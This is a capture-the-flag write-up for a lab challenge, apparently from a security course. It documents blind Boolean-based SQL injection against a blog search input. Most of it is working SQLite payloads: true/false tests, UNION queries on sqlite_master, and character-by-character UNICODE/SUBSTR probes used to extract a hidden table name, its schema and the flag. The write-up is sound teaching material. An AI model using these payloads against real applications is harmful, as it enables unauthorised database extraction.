# Challenge `Sometimes we are just temporarily blind` writeup

* **Flag:** `SSof{I_am_just_partially_blind_since_I_can_gEt_yoUr_datA_using_Boolean_Injections}`
* **Vulnerability:** Blind SQL Injection (Inference-based / Boolean-based SQL Injection)
* **Where:** Blog post search input on the landing page
* **Impact:** Allows extraction of database structure and sensitive information even when query results are not directly displayed.
* **NOTE:** Although results are hidden, the application leaks information through different responses depending on whether a SQL condition evaluates to true or false.

---

## Steps to reproduce

1. Navigate to the blog post search input on the landing page.

2. Notice that, unlike previous challenges, no blog posts are displayed, regardless of the query.

3. However, observe that the application still provides feedback below the search input, in the form of a message such as:

   * `Found N articles with search query '...'`
   * `Found 0 articles with search query '...'`

4. This behavior indicates that although the content is hidden, the backend query is still being executed and its result affects the response, which is a classic indicator of inference-based (blind) SQL Injection.

7. More specifically, when we test this hypothesis by injecting Boolean conditions into the search input, we can observe the response:

   * When the injected condition evaluates to **true**, the page consistently shows:

     ```
     Search payload: ' AND 1=1 --
     Result: Found 4 articles with search query ...
     ```
   * When the injected condition evaluates to **false**, the page consistently shows:

     ```
     Search payload: ' AND 1=0 --
     Result: Found 0 articles with search query ...
     ```

   This confirms that Boolean inference is possible.

8. Attempt to reuse the previously successful UNION-based payload:

   ```sql
   ' UNION SELECT 1, name, sql FROM sqlite_master WHERE type='table'; --
   ```

9. Observe that this query still returns the same number of results from the previous challenge:

   ```
   Found 7 articles with search query ...
   ```

   This corresponds to:

   * 4 real blog posts
   * 3 rows coming from `sqlite_master`, representing database tables

10. This indicates that the number of tables is unchanged.

11. Attempt to directly dump the previously known secret table:

```sql
' UNION SELECT id, title, content FROM secret_blog_post ; --
```

12. This results in the following error:

```
(sqlite3.OperationalError) no such table: secret_blog_post [SQL: SELECT id, title, content FROM blog_post WHERE title LIKE '%' UNION SELECT id, title, content FROM secret_blog_post ; --%' OR content LIKE '%' UNION SELECT id, title, content FROM secret_blog_post ; --%'] (Background on this error at: https://sqlalche.me/e/14/e3q8)
```

13. From this, infer that:

* The previous secret table no longer exists
* But it was replaced with another hidden table
* Therefore, the table name must be rediscovered (using blind techniques)

14. Begin extracting the hidden table name by querying `sqlite_master` using character-by-character Boolean conditions.

15. Use the following payload structure, which checks if the ASCII value of a specific character in the table name is greater than a certain threshold:

```sql
' AND UNICODE(
    SUBSTR(
      (SELECT name FROM sqlite_master
       WHERE type='table'
       AND name <> 'user'
       AND name <> 'blog_post'),
      {char_position}, 1
    )
  ) > {ascii_threshold} ; --
```

This allows performing a binary search over ASCII values for each character position in the table name and whenever the condition is true or false, we can deduce the actual character.

16. Interpretation of the response:

* If the response shows:

  ```
  Found 4 articles with search query...
  ```

  then the condition is **true**, meaning the character’s ASCII value is **greater than** `{ascii_threshold}`.
* If the response shows:

  ```
  Found 0 articles with search query...
  ```

  then the condition is **false**, meaning the character’s ASCII value is **less than or equal to** `{ascii_threshold}`.

17. Automate this process using a Python script that:

* Iterates over character positions
* Performs a binary search over ASCII values
* Determines each character based on the Boolean response

My script is available [here](Sometimes_we_are_just_temporarily_blind_poc.py)

18. This process reveals the hidden table name incrementally, resulting in:

```
super_s_sof_secrets
```

19. Using the same inference logic, extract the table definition from `sqlite_master` by changing the queried field to `sql`:

```sql
' AND UNICODE(
    SUBSTR(
      (SELECT sql FROM sqlite_master
       WHERE type='table'
       AND name <> 'user'
       AND name <> 'blog_post'),
      {char_position}, 1
    )
  ) > {ascii_threshold} ; --
```

20. The extracted schema is:

```
CREATE TABLE super_s_sof_secrets (
    id INTEGER NOT NULL,
    secret TEXT,
    PRIMARY KEY (id)
)
```

21. Finally, extract the secret value stored in the table using:

```sql
' AND UNICODE(
    SUBSTR(
      (SELECT secret FROM super_s_sof_secrets),
      {char_position}, 1
    )
  ) > {ascii_threshold} ; --
```

22. Apply the same binary-search-based inference technique to reconstruct the secret character by character.

23. The final extracted secret is:

```
SSof{I_am_just_partially_blind_since_I_can_gEt_yoUr_datA_using_Boolean_Injections}
```

[(POC)](Sometimes_we_are_just_temporarily_blind_poc.py)